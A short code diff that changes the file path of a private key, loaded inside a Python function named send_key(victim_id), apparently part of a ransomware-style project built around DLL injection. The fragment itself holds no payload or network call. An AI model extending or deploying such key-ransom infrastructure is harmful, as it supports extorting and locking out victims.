@@ -65,7 +65,7 @@ def send_key(victim_id):
     encrypted_key_bytes = base64.b64decode(encrypted_key)
 
     # load private key
-    with open('dll_injection/build/private_key.pem', 'rb') as f:
+    with open('dll_injection/keys/private_key.pem', 'rb') as f:
         private_key_data = f.read()
     
     private_key = serialization.load_pem_private_key(
